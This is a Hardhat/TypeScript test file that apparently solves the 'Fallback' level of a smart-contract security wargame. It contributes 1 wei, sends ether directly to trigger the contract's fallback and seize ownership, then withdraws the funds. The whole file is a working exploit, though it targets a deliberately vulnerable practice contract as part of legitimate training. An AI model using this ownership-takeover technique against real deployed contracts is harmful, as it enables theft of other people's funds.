import { ethers } from 'hardhat'
import type { Contract, Signer, ContractTransaction } from 'ethers'
import { createChallenge, submitLevel } from '../utils/utils'
import { expect } from 'chai'

describe('Fallback', () => {
  let accounts: Signer[]
  let eoa: Signer
  let challenge: Contract
  let tx: ContractTransaction
  beforeEach(async () => {
    accounts = await ethers.getSigners()
    ;[eoa] = accounts
    const challengeFactory = await ethers.getContractFactory('Fallback')
    const challengeAddress = await createChallenge('0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB')
    challenge = challengeFactory.attach(challengeAddress)
  })
  it('solves the fallback challenge', async () => {
    tx = await challenge.contribute({
      value: ethers.utils.parseUnits(`1`, `wei`),
    })
    await tx.wait()
    tx = await eoa.sendTransaction({ to: challenge.address, value: ethers.utils.parseUnits('1', 'wei') })
    await tx.wait()
    tx = await challenge.withdraw()
    await tx.wait()
    const owner = await challenge.owner()
    expect(owner).to.equal(await eoa.getAddress())
  })
  after(async () => {
    expect(await submitLevel(challenge.address), 'level not solved').to.be.true
  })
})
